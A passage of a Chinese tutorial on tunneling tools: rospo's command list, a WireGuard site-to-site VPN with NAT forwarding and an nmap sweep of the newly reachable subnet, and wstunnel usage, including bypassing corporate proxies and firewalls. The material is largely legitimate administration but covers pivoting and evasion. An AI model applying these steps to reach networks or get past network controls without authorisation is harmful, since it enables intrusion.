  dns-proxy    启动DNS-over-TCP代理
  get          从远程主机获取文件
  grabpubkey   抓取主机公钥并存入known_hosts文件
  help         查看任意命令的帮助信息
  keygen       生成SSH密钥对
  put          将本地文件上传至远程主机
  revshell     启动反向shell连接
  run          使用配置文件运行rospo
  shell        启动远程shell会话
  socks-proxy  启动SOCKS代理服务
  sshd         启动SSH守护进程
  template     生成配置模板文件
  tun          创建可靠SSH隧道

全局参数：
  -h, --help     显示帮助信息
  -q, --quiet    启用静默模式（关闭所有日志输出）
  -v, --version  显示版本信息

使用 "rospo [子命令] --help" 查看具体命令的详细说明
```



### socks

监听本地 8080 端口，允许 socks 入站，入站流量转发到远程主机。

```
rospo socks-proxy -i -l 0.0.0.0:8080 -p 111 root@10.12.0.100:2222
```



命令示例

```
启动SOCKS代理服务

支持协议版本：
  ✔ SOCKS4/SOCKS5 双协议支持

使用说明：
  需在浏览器中配置SOCKS代理。Windows系统用户需在代理配置界面的地址栏填写 "socks=localhost"

用法：
  rospo socks-proxy [用户@]主机[:端口] [参数]

示例：
  # 在127.0.0.1:1080启动SOCKS代理
  # 通过SSH服务器（sshhost:sshport）建立隧道
  $ rospo proxy sshhost:sshport

参数：
  -b, --disable-banner         禁用服务器横幅显示
  -h, --help                   显示帮助信息
  -i, --insecure               禁用已知主机密钥验证
  -j, --jump-host string       指定跳板机配置（可选）
  -k, --known-hosts string     known_hosts文件绝对路径（默认"/root/.ssh/known_hosts"）
  -l, --listen-address string  代理监听地址（默认"127.0.0.1:1080"）
  -p, --password string        SSH客户端密码
  -s, --user-identity string   SSH身份（私钥）绝对路径（默认"/root/.ssh/id_rs
```





### 示例

```
创建可靠SSH隧道的工具集

用法：
  rospo [参数]
  rospo [子命令]

可用命令：
  completion   生成指定shell的自动补全脚本
  dns-proxy    启动DNS-over-TCP代理
  get          从远程主机获取文件
  grabpubkey   抓取主机公钥并存入known_hosts文件
  help         查看任意命令的帮助信息
  keygen       生成SSH密钥对
  put          将本地文件上传至远程主机
  revshell     启动反向shell连接
  run          使用配置文件运行rospo
  shell        启动远程shell会话
  socks-proxy  启动SOCKS代理服务
  sshd         启动SSH守护进程
  template     生成配置模板文件
  tun          创建可靠SSH隧道

全局参数：
  -h, --help     显示帮助信息
  -q, --quiet    启用静默模式（关闭所有日志输出）
  -v, --version  显示版本信息

使用 "rospo [子命令] --help" 查看具体命令的详细说明
```



## WireGuard

WireGuard 是一种开源的现代 VPN 协议， 通过 UDP 安全封装 IP 数据包，可以承载 **所有基于 IP 协议的流量**（IPv4/IPv6），其核心特点有**简洁高效**（**代码量仅约4000行**，更易审计漏洞和维护）、**高性能**（Linux内核实现）、**强加密**（基于现代密码学 Curve25519椭圆曲线、ChaCha20加密、BLAKE2哈希）、**跨平台**（Linux、Windows、macOS、iOS、Android 等）。

**相较于传统 VPN（如 OpenVPN/IPsec）**，其代码规模仅为 OpenVPN 的 **1/50**（4000行 vs 20万+行），服务端配置从 IPsec 的 **500+行** 缩减至 **单文件6 - 20行**，且密钥轮换、隧道维护等操作均可通过修改 **3-4个参数** 实时生效。



### 示例

以下是**两台 Linux 搭建 VPN 隧道**的示例：

| 主机   | 物理IP                     | VPN IP   |
| ------ | -------------------------- | -------- |
| Linux1 | 10.12.0.201                | 10.0.0.1 |
| Linux2 | 10.12.0.202<br>10.13.0.201 | 10.0.0.2 |
| Linux3 | 10.13.0.202                | NULL     |

Linux1 与 Linux2 可直接通信，Linux2 与 Linux3 也可互通，但 **Linux1 无法直连 Linux3**。为此在 **Linux1 和 Linux2 之间建立 WireGuard 加密隧道**，将 Linux1 访问 Linux3 的流量定向至该隧道传输至 Linux2，再由 Linux2 通过 **NAT 地址转换**将流量转发至 Linux3。

![img](./images/%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E8%BF%90%E7%94%A8.assets/image.svg)



自 Linux 5.6 起，内核已原生**集成 WireGuard 协议栈**，可通过标准 `ip link` 命令直接创建 WireGuard 虚拟接口；对于 5.6 之前的内核版本，需通过用户空间实现工具 `wireguard-go` 创建兼容接口。

配置WireGuard接口需使用wg工具，较新系统可通过包管理器直接安装wireguard-tools，而老旧系统可以通过源码编译安装。

- [【wireguard-go】](https://github.com/WireGuard/wireguard-go)：WireGuard 的用户空间实现，适用于内核未原生支持 WireGuard 的环境（**仅源代码**）。
- [【wireguard-go-builder】](https://github.com/P3TERX/wireguard-go-builder)：提供不同平台（如 ARM、MIPS 等）构建静态链接的 `wireguard-go` **二进制文件**。
- [【wireguard-tools】](https://github.com/WireGuard/wireguard-tools)：WireGuard 命令行工具集，包含 `wg` 和 `wg-quick`等工具（**仅源代码**）。



#### 通用准备（在所有节点执行）

```
# 生成密钥对（所有节点执行）
# [N]为节点编号占位符（例：linux1/linux2），需替换为实际数字
wg genkey | tee private_key_linux[N] | wg pubkey > public_key_linux[N]

# 创建WireGuard接口（根据内核版本选择）
# Linux 5.6+ 内核原生支持
ip link add dev wg0 type wireguard

# 旧版内核（<5.6）需要wireguard-go
wireguard-go wg0
```



#### Linux 1

配置虚拟接口

```
ip addr add 10.0.0.1/24 dev wg0
ip link set wg0 up
```



创建配置文件 /etc/wireguard/wg0.conf

```
[Interface]
ListenPort = 51820
PrivateKey = ULgCzX94OpIxbuSfqw57YfoTd+55lkwAEX6BC1PKfWw=

[Peer]
PublicKey = MbS80tQ9RiHPfTocgAoHFEeaZqVT25ws9ZF+zGueS3g=
AllowedIPs = 10.0.0.2/32
```

- **PrivateKey：Linux 1 私钥文件内容**
- **PublicKey：Linux 2 公钥文件内容**



应用配置文件

```
wg setconf wg0 wg0.conf
```



#### Linux 2

```
ip addr add 10.0.0.2/24 dev wg0
ip link set wg0 up
```



创建配置文件 /etc/wireguard/wg0.conf

```
[Interface]
ListenPort = 51820
PrivateKey = ENv2cywBG2rEVPyucbcGwJVvWms9GeCfhEcQi9SkSEE=

[Peer]
PublicKey = jG+QjJAyc3SfG8b8Mbg60FmN0mgONqsdDzUHjNg7vg4=
AllowedIPs = 10.0.0.1/32
Endpoint = 10.12.0.201:51820
PersistentKeepalive = 25
```

- **PrivateKey：Linux 2 私钥文件内容**
- **PublicKey：Linux 1 公钥文件内容**



应用配置文件

```
wg setconf wg0 wg0.conf
```



#### 查看状态

```bash
[root@linux1 ~]# wg 
interface: wg0
  public key: jG+QjJAyc3SfG8b8Mbg60FmN0mgONqsdDzUHjNg7vg4=
  private key: (hidden)
  listening port: 51820

peer: MbS80tQ9RiHPfTocgAoHFEeaZqVT25ws9ZF+zGueS3g=
  endpoint: 10.12.0.202:51820
  allowed ips: 10.0.0.2/32
  latest handshake: 1 minute, 1 second ago
  transfer: 4.97 KiB received, 1.98 KiB sent

[root@linux2 ~]# wg 
interface: wg0
  public key: MbS80tQ9RiHPfTocgAoHFEeaZqVT25ws9ZF+zGueS3g=
  private key: (hidden)
  listening port: 51820

peer: jG+QjJAyc3SfG8b8Mbg60FmN0mgONqsdDzUHjNg7vg4=
  endpoint: 10.12.0.201:51820
  allowed ips: 10.0.0.1/32
  latest handshake: 1 minute, 10 seconds ago
  transfer: 9.91 KiB received, 32.68 KiB sent
  persistent keepalive: every 25 seconds
```



#### WireGuard 隧道连通性测试

```
[root@linux2 ~]# ping 10.0.0.2 -c 4
PING 10.0.0.2 (10.0.0.2) 56(84) bytes of data.
64 bytes from 10.0.0.2: icmp_seq=1 ttl=64 time=0.014 ms
64 bytes from 10.0.0.2: icmp_seq=2 ttl=64 time=0.032 ms
64 bytes from 10.0.0.2: icmp_seq=3 ttl=64 time=0.028 ms
64 bytes from 10.0.0.2: icmp_seq=4 ttl=64 time=0.029 ms

--- 10.0.0.2 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3111ms
rtt min/avg/max/mdev = 0.014/0.025/0.032/0.009 ms


[root@linux1 ~]# ssh root@10.0.0.2 
root@10.0.0.2's password: 
Last login: Sat Feb 15 03:44:29 2025 from 10.0.0.1
[root@linux2 ~]# 
```



#### 配置 NAT 转发

**Linux 2** 启用 **net.ipv4.ip_forward（永久生效）**

```
# 编辑配置文件
vim /etc/sysctl.conf

# 添加或取消注释以下行（IPv4）
net.ipv4.ip_forward = 1

# 加载配置使其生效
sysctl -p
```



**Linux 2** 配置 **VPN网关流量转发与NAT规则（重启后失效）** 

```
# NAT地址伪装：将来自10.0.0.0/16网段的流量通过ens224接口做源地址转换（内网访问外网）
iptables -t nat -A POSTROUTING -s 10.0.0.0/16 -o ens224 -j MASQUERADE

# 转发规则：允许从VPN接口(wg0)到外网接口(ens224)的流量（出站方向）
iptables -A FORWARD -i wg0 -o ens224 -j ACCEPT

# 转发规则：仅允许外网接口(ens224)到VPN的回程流量（已建立连接和相关连接）
iptables -A FORWARD -i ens224 -o wg0 -m state --state RELATED,ESTABLISHED -j ACCEPT
```



**Linux 1** 添加**路由表（重启后失效）**

```
# 添加静态路由：将10.13.0.0/16网段流量通过VPN网关10.0.0.2路由
ip route add 10.13.0.0/16 via 10.0.0.2 dev wg0
```



#### Linux 1 和 3 连通性测试

```
[root@linux1 ~]# ping 10.13.0.202 -c 4 
PING 10.13.0.202 (10.13.0.202) 56(84) bytes of data.
64 bytes from 10.13.0.202: icmp_seq=1 ttl=63 time=2.15 ms
64 bytes from 10.13.0.202: icmp_seq=2 ttl=63 time=0.892 ms
64 bytes from 10.13.0.202: icmp_seq=3 ttl=63 time=1.49 ms
64 bytes from 10.13.0.202: icmp_seq=4 ttl=63 time=0.996 ms

--- 10.13.0.202 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3019ms
rtt min/avg/max/mdev = 0.892/1.381/2.151/0.497 ms


[root@linux1 ~]# ssh root@10.13.0.202 
root@10.13.0.202's password: 
Last login: Sat Feb 15 22:40:33 2025 from 10.13.0.1
[root@linux3 ~]# 
```



使用 **nmap** 扫描 **10.13.0.0/16** 网段

```
[root@linux1 ~]# nmap -sn -PE  10.13.0.0/16
Starting Nmap 7.70 ( https://nmap.org ) at 2025-02-15 22:53 CST
Nmap scan report for 10.13.0.1
Host is up (0.012s latency).
Nmap scan report for 10.13.0.162
Host is up (0.0030s latency).
Nmap scan report for 10.13.0.201
Host is up (0.00094s latency).
Nmap scan report for 10.13.0.202
Host is up (0.0030s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 3.72 seconds
```



### 配置文件

配置文件格式基于 *INI* 文件。其中包含两个顶级部分——*Interface*（接口）和 *Peer*（对等体）。可以指定多个 *Peer* 部分，但只能有一个 *Interface* 部分。



*Interface* 部分可能包含以下字段：

- ***Address*** — 要分配给接口的逗号分隔的 IP（v4 或 v6）地址列表（可选带 CIDR 掩码）。可以多次指定。
- ***DNS*** — 要设置为接口的 DNS 服务器的逗号分隔的 IP（v4 或 v6）地址列表，或要设置为接口的 DNS 搜索域的非 IP 主机名。可以多次指定。
- ***MTU*** — 如果未指定，MTU 将从端点地址或系统默认路由自动确定，这通常是一个明智的选择。然而，要手动指定一个 MTU 以覆盖这种自动发现，可以显式指定此值。
- ***Table*** — 控制向其添加路由的路由表。有两个特殊值：`off` 完全禁用路由的创建，`auto`（默认值）将路由添加到默认表并启用默认路由的特殊处理。
- ***PreUp, PostUp, PreDown, PostDown*** — 在设置/拆除接口之前/之后由 **bash** 执行的脚本片段，最常用于配置自定义 DNS 选项或防火墙规则。特殊字符串 `%i' 会被扩展为 *INTERFACE*。每个键可以多次指定，在这种情况下，命令按顺序执行。
- ***SaveConfig*** — 如果设置为 `true'，则在关闭时从接口的当前状态保存配置。因此，在删除接口之前对配置文件所做的任何更改都将被覆盖。

- **PrivateKey** — 由 *wg genkey* 生成的 base64 编码私钥。必填。
- **ListenPort** — 用于监听的 16 位端口号。可选；如果未指定，则随机选择。
- **FwMark** — 用于标记传出数据包的 32 位防火墙标记（fwmark）。如果设置为 0 或 "off"，则此选项被禁用。可以通过添加前缀 "0x" 来以十六进制形式指定。可选。

*Peer* 部分可能包含以下字段：

- **PublicKey** — 通过 *wg pubkey* 根据私钥计算出的 base64 编码公钥，通常通过带外方式传输给配置文件的作者。必填。
- **PresharedKey** — 由 *wg genpsk* 生成的 base64 编码预共享密钥。可选，也可以省略。该选项增加了一层额外的对称密钥加密，与现有的公钥加密结合使用，以提供抗量子计算的能力。
- **AllowedIPs** — 使用 CIDR 掩码表示的 IP 地址（IPv4 或 IPv6）列表，用逗号分隔。用于指定允许来自该对等体的入站流量来源，以及出站流量的目标地址。可以使用通配符 *0.0.0.0/0* 匹配所有 IPv4 地址，或使用 *::/0* 匹配所有 IPv6 地址。此字段可以多次指定。
- **Endpoint** — 一个 IP 地址或主机名，后面跟一个冒号和端口号。该端点会根据从对等体接收到的正确验证的数据包的最新源 IP 地址和端口自动更新。可选。
- **PersistentKeepalive** — 指定发送经过认证的空数据包到对等体的时间间隔（秒），范围为 1 到 65535（含）。其目的是持续保持状态防火墙或 NAT 映射的有效性。例如，如果接口很少发送流量，但可能会随时接收来自对等体的流量，并且位于 NAT 后面，则设置 25 秒的持久化保活间隔可能是有益的。如果设置为 0 或 "off"，此选项将被禁用。默认情况下或未指定时，此选项关闭。大多数用户不需要此功能。可选。







## wstunnel

Wstunnel 使用与 http 兼容的 websocket 协议来绕过防火墙和代理。Wstunnel 允许你传输任何你想要的流量，并访问任何你需要的资源/网站。

### 命令行

#### Server

```
SERVER
Usage: wstunnel server [OPTIONS] <ws[s]://0.0.0.0[:port]>

参数:
  <ws[s]://0.0.0.0[:port]>
          绑定 wstunnel 服务器的地址
          示例: 使用 TLS wss://0.0.0.0:8080 或者不带 ws://[::]:8080
          
          服务器能够自行检测请求是 websocket 还是 http2。因此你不需要指定它。

选项:
      --socket-so-mark <INT>
          （仅限 linux）使用 SO_MARK sockoption 标记网络数据包，并指定值。
          使用此选项时，你需要使用 {root, sudo, capabilities} 来运行 wstunnel

      --websocket-ping-frequency-sec <seconds>
          服务器向客户端发送 websocket ping 的频率。

      --no-color <NO_COLOR>
          禁用日志中的彩色输出
          
          [env: NO_COLOR=]

      --websocket-mask-frame
          启用 websocket 帧的掩码。默认为 false
              只有在使用非安全（非 TLS）websocket 服务器并看到一些问题时才启用此选项。否则，这只是开销。

      --nb-worker-threads <INT>
          *警告* 该标志无效，你需要设置环境变量 *警告*
          控制将使用的线程数量。
          默认情况下，它等于 CPU 数量
          
          [env: TOKIO_WORKER_THREADS=]

      --restrict-to <DEST:PORT>
          服务器将只接受来自指定隧道信息的连接。
          可以多次指定
          示例: --restrict-to "google.com:443" --restrict-to "localhost:22"

      --dns-resolver <DNS_RESOLVER>
          使用的 DNS 解析器来查找域名的 IP
          如果你使用透明代理，此选项将不起作用
          可以多次指定
          示例:
           dns://1.1.1.1 用于使用 udp
           dns+https://1.1.1.1?sni=loudflare-dns.com 用于使用 DNS over HTTPS
           dns+tls://8.8.8.8?sni=dns.google 用于使用 DNS over TLS
          要使用 libc 解析器，请使用
          system://0.0.0.0

      --log-lvl <LOG_LEVEL>
          控制日志详细程度。例如: TRACE, DEBUG, INFO, WARN, ERROR, OFF
          更多详情: https://docs.rs/tracing-subscriber/latest/tracing_subscriber/filter/struct.EnvFilter.html#example-syntax
          
          [env: RUST_LOG=]
          [默认值: INFO]

  -r, --restrict-http-upgrade-path-prefix <RESTRICT_HTTP_UPGRADE_PATH_PREFIX>
          服务器将只接受在此特定路径前缀下使用 websocket 升级的连接。
          如果你在客户端指定了自定义路径前缀，并且希望服务器只允许这个前缀，则很有用。
          路径前缀充当认证客户端的秘密
          默认禁用。接受所有路径前缀。可以多次指定
          
          [env: WSTUNNEL_RESTRICT_HTTP_UPGRADE_PATH_PREFIX=]

      --restrict-config <RESTRICT_CONFIG>
          限制 yaml 配置文件的位置路径。
          如果配置文件发生变化，限制文件将自动重新加载

      --tls-certificate <FILE_PATH>
          [可选] 使用自定义证书（pem）代替默认嵌入的自签名证书。
          如果证书更改，证书将自动重新加载

      --tls-private-key <FILE_PATH>
          [可选] 服务器将使用的自定义 tls 密钥（pem, ec, rsa）代替默认嵌入的密钥
          如果私钥更改，私钥将自动重新加载

      --tls-client-ca-certs <FILE_PATH>
          [可选] 启用 mTLS（客户端使用证书进行身份验证）。参数必须是包含一个或多个 CA 证书的 PEM 文件，
          客户端证书需要由这些 CA 签署。
          如果 CA 发生变化，CA 将自动重新加载
          
    -p, --http-proxy <USER:PASS@HOST:PORT>
          如果设置，将使用此 http 代理连接到客户端

          [env: HTTP_PROXY=]

      --http-proxy-login <LOGIN>
          如果设置，将使用此登录名连接到 http 代理。覆盖 --http-proxy 中的登录名

          [env: WSTUNNEL_HTTP_PROXY_LOGIN=]

      --http-proxy-password <PASSWORD>
          如果设置，将使用此密码连接到 http 代理。覆盖 --http-proxy 中的密码

          [env: WSTUNNEL_HTTP_PROXY_PASSWORD=]
```



#### Client

```
Usage: wstunnel client [OPTIONS] <ws[s]|http[s]://wstunnel.server.com[:port]>

参数:
  <ws[s]|http[s]://wstunnel.server.com[:port]>
          wstunnel 服务器地址
          你可以使用 websocket 或 http2 作为传输协议。如果不确定，请使用 websocket。
          示例: 对于带 TLS 的 websocket wss://wstunnel.example.com 或者不带 ws://wstunnel.example.com
                   对于带 TLS 的 http2 https://wstunnel.example.com 或者不带 http://wstunnel.example.com
          
          *警告* HTTP2 作为传输协议更难使其工作，因为：
            - 如果你在 (反向) 代理/CDN 后面，它们会在将整个请求转发给服务器之前缓冲整个请求
              显然，这对于隧道流量不起作用
            - 如果你有 wstunnel 在反向代理后面，大部分（例如：nginx）会将 http2 请求转换为 http1
              这不会起作用，因为 http1 不自然地支持流式传输
          让 http2 工作的唯一方法是让 wstunnel 直接暴露在互联网上，而没有任何反向代理在前面

选项:
  -L, --local-to-remote <{tcp,udp,socks5,stdio,unix}://[BIND:]PORT:HOST:PORT>
          本地监听并将远程流量转发。可以多次指定
          示例:
          'tcp://1212:google.com:443'      =>       在本地 tcp 端口 1212 上监听并转发到 google.com 的 443 端口
          'tcp://2:n.lan:4?proxy_protocol' =>       在本地 tcp 端口 2 上监听并转发到 n.lan 的 4 端口
                                                    当建立与 n.lan 的连接时发送代理协议头 v2
          
          'udp://1212:1.1.1.1:53'          =>       在本地 udp 端口 1212 上监听并转发到 cloudflare dns 1.1.1.1 的 53 端口
          'udp://1212:1.1.1.1:53?timeout_sec=10'    timeout_sec 强制关闭隧道后 10 秒。将其设置为 0 以禁用超时 [默认值: 30]
          
          'socks5://[::1]:1212'            =>       在本地 socks5 端口 1212 上监听并动态转发请求的隧道
          'socks5://[::1]:1212?login=admin&password=admin' => 在本地 socks5 端口 1212 上监听并且仅接受登录=admin 和密码=admin 的连接
          
          'http://[::1]:1212'              =>       在端口 1212 上启动 http 代理并动态转发请求的隧道
          'http://[::1]:1212?login=admin&password=admin' => 在端口 1212 上启动 http 代理并且仅接受登录=admin 和密码=admin 的连接

          'tproxy+tcp://[::1]:1212'        =>       在本地 tcp 端口 1212 上监听作为 *透明代理* 并动态转发请求的隧道
          'tproxy+udp://[::1]:1212?timeout_sec=10'  在本地 udp 端口 1212 上监听作为 *透明代理* 并动态转发请求的隧道
                                                    仅限 linux 并需要 sudo/CAP_NET_ADMIN
          
          'stdio://google.com:443'         =>       监听来自 stdio 的数据，主要用于 `ssh -o ProxyCommand="wstunnel client --log-lvl=off -L stdio://%h:%p ws://localhost:8080" my-server`
          
          'unix:///tmp/wstunnel.sock:g.com:443' =>  从路径 /tmp/wstunnel.sock 的 unix socket 监听数据并转发到 g.com:443

  -R, --remote-to-local <{tcp,udp,socks5,unix}://[BIND:]PORT:HOST:PORT>
          在远程监听并从本地转发流量。可以多次指定。仅支持 tcp
          示例:
          'tcp://1212:google.com:443'      =>     在服务器上监听传入的 tcp 连接在端口 1212 并从本地机器转发到 google.com 的 443 端口
          'udp://1212:1.1.1.1:53'          =>     在服务器上监听传入的 udp 流量在端口 1212 并从本地机器转发到 cloudflare dns 1.1.1.1 的 53 端口
          'socks5://[::1]:1212'            =>     在服务器上监听传入的 socks5 请求在端口 1212 并从本地机器动态转发请求
          'http://[::1]:1212'              =>     在服务器上监听传入的 http 代理请求在端口 1212 并从本地机器动态转发请求（支持登录/密码）
          'unix://wstunnel.sock:g.com:443' =>     在服务器上监听来自路径 wstunnel.sock 的 unix socket 的传入数据并从本地机器转发到 g.com:443

      --no-color <NO_COLOR>
          禁用日志中的彩色输出
          
          [env: NO_COLOR=]

      --socket-so-mark <INT>
          （仅限 linux）使用 SO_MARK sockoption 标记网络数据包，并指定值。
          使用此选项时，你需要使用 {root, sudo, capabilities} 来运行 wstunnel

  -c, --connection-min-idle <INT>
          客户端将保持一个到服务器的开放连接池，以加快连接过程。
          此选项设置将保持打开的最大连接数。
          如果你计划创建/销毁大量隧道（即使用 socks5 浏览浏览器），这很有用。
          它将避免与服务器进行 tcp + tls 握手的延迟
          
          [默认值: 0]

      --nb-worker-threads <INT>
          *警告* 该标志无效，你需要设置环境变量 *警告*
          控制将使用的线程数量。
          默认情况下，它等于 CPU 数量
          
          [env: TOKIO_WORKER_THREADS=]

      --log-lvl <LOG_LEVEL>
          控制日志详细程度。例如: TRACE, DEBUG, INFO, WARN, ERROR, OFF
          更多详情: https://docs.rs/tracing-subscriber/latest/tracing_subscriber/filter/struct.EnvFilter.html#example-syntax
          
          [env: RUST_LOG=]
          [默认值: INFO]

      --tls-sni-override <DOMAIN_NAME>
          在 TLS 握手期间将用作 SNI 的域名
          警告: 如果你在 CDN（如 Cloudflare）后面，你也必须在 http HOST 头中设置此域名。
                否则会被标记为可疑并拒绝你的请求

      --tls-sni-disable
          禁用在 TLS 握手期间发送 SNI
          警告: 大多数反向代理依赖于此

      --tls-verify-certificate
          启用 TLS 证书验证。
          默认禁用。客户端将愉快地连接到具有自签名证书的任何服务器。

  -p, --http-proxy <USER:PASS@HOST:PORT>
          如果设置，将使用此 http 代理连接到服务器
          
          [env: HTTP_PROXY=]

      --http-proxy-login <LOGIN>
          如果设置，将使用此登录名连接到 http 代理。覆盖 --http-proxy 中的登录名
          
          [env: WSTUNNEL_HTTP_PROXY_LOGIN=]

      --http-proxy-password <PASSWORD>
          如果设置，将使用此密码连接到 http 代理。覆盖 --http-proxy 中的密码
          
          [env: WSTUNNEL_HTTP_PROXY_PASSWORD=]

  -P, --http-upgrade-path-prefix <HTTP_UPGRADE_PATH_PREFIX>
          使用特定前缀，在升级请求期间显示在 http 路径中。
          如果你需要在服务器端路由请求但没有 vhosts，则很有用
          
          [env: WSTUNNEL_HTTP_UPGRADE_PATH_PREFIX=]
          [默认值: v1]

      --http-upgrade-credentials <USER[:PASS]>
          在升级请求期间传递带有基本认证凭据的授权头。
          如果你需要更多定制，可以使用 http_headers 选项。

      --websocket-ping-frequency-sec <seconds>
          客户端向服务器发送 websocket ping 的频率。
          
          [默认值: 30]

      --websocket-mask-frame
          启用 websocket 帧的掩码。默认为 false
          只有在使用非安全（非 TLS）websocket 服务器并看到一些问题时才启用此选项。否则，这只是开销。

  -H, --http-headers <HEADER_NAME: HEADER_VALUE>
          在升级请求中发送自定义头
          可以多次指定

      --http-headers-file <FILE_PATH>
          从文件中读取并在升级请求中发送自定义头。
          它会覆盖从命令行指定的 http_headers。
          文件每次都会被读取，文件格式必须包含 `HEADER_NAME: HEADER_VALUE` 的行

      --tls-certificate <FILE_PATH>
          [可选] 连接通过 TLS（HTTPS）时呈现给服务器的证书（pem）。
          当服务器要求客户端使用证书进行身份验证时使用（即 mTLS）。
          如果证书更改，证书将自动重新加载

      --tls-private-key <FILE_PATH>
          [可选] 用于 mTLS 的相应证书的私钥。
          如果证书更改，证书将自动重新加载

      --dns-resolver <DNS_RESOLVER>
          使用的 DNS 解析器来查找域名的 IP。可以多次指定
          示例:
           dns://1.1.1.1 用于使用 udp
           dns+https://1.1.1.1?sni=cloudflare-dns.com 用于使用 DNS over HTTPS
           dns+tls://8.8.8.8?sni=dns.google 用于使用 DNS over TLS
          对于 Dns over HTTPS/TLS，如果配置了 HTTP 代理，也将使用它
          要使用 libc 解析器，请使用
          system://0.0.0.0

          **警告** 在 Windows 上，你可能希望明确指定 DNS 解析器以避免过多的 DNS 查询
```



### 示例

#### 最简单的示例

在你的远程主机上，通过在终端输入以下命令启动 wstunnel 的服务器

```
wstunnel server wss://[::]:8080
```



这将在任何接口上创建一个 websocket 服务器，监听 8080 端口。

在客户端使用以下命令通过 websocket 隧道转发流量。

```
wstunnel client -L socks5://127.0.0.1:8888 --connection-min-idle 5 wss://myRemoteHost:8080
```



此命令将创建一个 socks5 服务器，监听环回接口的 8888 端口，并动态转发流量。 `connection-min-idle 10` 是一种优化，创建一个连接到服务器的 10 个连接池，以加速新隧道的建立。

使用 firefox 可以通过在网络首选项中设置 127.0.0.1:8888 并选择 socks5 代理来设置使用此隧道的代理。 确保检查选项 `Proxy DNS when using SOCKS v5` 让服务器解析 DNS 名称而不是本地机器。

```
curl -x socks5h://127.0.0.1:8888 http://google.com/
#请注意 h 在 5 之后，是为了避免 curl 在本地解析 DNS 名称
```



#### 作为 SSH 的代理命令

如果希望使用 wstunnel 作为 ssh 代理命令的一部分，可以在客户端侧指定 `stdio` 作为源端口

```
ssh -o ProxyCommand="wstunnel client --log-lvl=off -L stdio://%h:%p ws://myRemoteHost:8080" my-server
```



#### 在公司代理后面

另一个有用的示例是当你想绕过 http 代理（例如公司代理）时。

最可靠的方法是按如下方式使用 wstunnel。



启动 wstunnel 服务器并激活 tls。

```
wstunnel server wss://[::]:443 --restrict-to 127.0.0.1:22
```

- 服务器将在任何接口上监听 443 端口（https）并将流量**限制为仅转发到 ssh 守护进程**。
- **请注意，服务器将使用弱加密算法的自签名证书。 这样做是为了在仍然符合 tls 的同时添加最少的可能开销。**

- **不要依赖 wstunnel 来保护你的隐私，如果你对此有顾虑，你应该只转发设计上已经安全的流量（即：https 或 vpn 流量）**



现在在客户端启动客户端。

```
wstunnel client -L tcp://9999:127.0.0.1:22 -p http://mycorporateproxy:8080 wss://myRemoteHost:443
```

这将在 9999 端口上启动一个 tcp 服务器，联系公司代理，与远程主机协商 tls 连接，并将流量转发到远程主机上的 ssh 守护进程。



你现在可以通过以下方式在本地机器上访问你的服务器。

```
ssh -p 9999 login@127.0.0.1
```



#### Wireguard 和 wstunnel

你有一个名为 `wg0.conf` 的有效 wireguard 客户端配置。比如

```
[Interface]
Address = 10.200.0.2/32, fd00:cafe::2/128
PrivateKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=

[Peer]
PublicKey = 9iicV7Stdl/U0RH1BNf3VvlVjaa4Eus6QPEfEz6cR0c=
AllowedIPs = 0.0.0.0/0, ::/0
Endpoint = my.server.com:51820
```



在 my.server.com 上启动 wstunnel 服务器如下。

```
wstunnel server --restrict-to localhost:51820 wss://[::]:443
```



在本地机器上启动客户端如下。

```
wstunnel client -L 'udp://51820:localhost:51820?timeout_sec=0' wss://my.server.com:443
```



更改你的 wireguard 客户端配置为

```
[Interface]
Address = 10.200.0.2/32, fd00:cafe::2/128
PrivateKey = xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
# 替换为你的服务器可以访问的 dns
dns = 8.8.8.8
# https://github.com/nitred/nr-wg-mtu-finder 找到最适合你的 mtu
MTU = 1400 

[Peer]
PublicKey = 9iicV7Stdl/U0RH1BNf3VvlVjaa4Eus6QPEfEz6cR0c=
AllowedIPs = 0.0.0.0/0, ::/0
# 应该目标 wstunnel 客户端监听的端口
Endpoint = localhost:51820
# 如果启用了 wstunnel 客户端 websocket ping，应该是不必要的
PersistentKeepalive = 20
```



为你的服务器添加一条默认路由，因为你的 AllowedIps 是捕获所有，这是为了避免流量循环。

```
sudo ip route add ip.of.my.server.com dev eth0 via 192.168.0.1
# 替换 eth0（接口）和 192.168.0.1（路由器网关）为 `ip route get ip.of.my.server.com` 提供的
```



启动你的 wireguard，它应该可以工作

```
sudo wg-quick up wg0
ping 10.200.0.1 # ping 你的 vpn 网络中的另一个 ip
```



#### 透明代理（仅限 linux）

透明代理允许轻松代理任何程序。



启动 wstunnel

```
sudo wstunnel client -L 'tproxy+tcp://1080' -L 'tproxy+udp://1080' wss://my.server.com:443
```



使用这个项目无缝路由流量 https://github.com/NOBLES5E/cproxy。它适用于任何程序

```
cproxy --port 1080 --mode tproxy -- curl https://google.com
```



你甚至可以启动一个新的 shell，在那里所有的命令都将被代理

```
cproxy --port 1080 --mode tproxy -- bash
```



#### 反向隧道

启动 wstunnel

```
sudo wstunnel client -R 'tcp://[::]:8000:localhost:8000' wss://my.server.com:443
```



在另一个终端，启动一个简单的本地 web 服务器

```
python3 -m http.server
```



从你的 my.server.com 机器/网络，你现在可以执行

```
curl http://localhost:8000
```



#### 多参数示例

服务端

```
wstunnel server --websocket-ping-frequency-sec 5 --restrict-to 127.0.0.1:51220 --restrict-http-upgrade-path-prefix 8935e24d-dfa8-41fd-bdf3-8c517ea2fa84 --tls-certificate cert.crt --tls-private-key cert.key --log-lvl DEBUG wss://0.0.0.0:8443
```



客户端

```
wstunnel client wss://47.242.138.179:8443 -L udp://51220:127.0.0.1:51220?timeout_sec=0 --tls-sni-override net.xiaoshae.cn --tls-verify-certificate --http-upgrade-path-prefix 8935e24d-dfa8-41fd-bdf3-8c517ea2fa84 --websocket-ping-frequency-sec 5
```

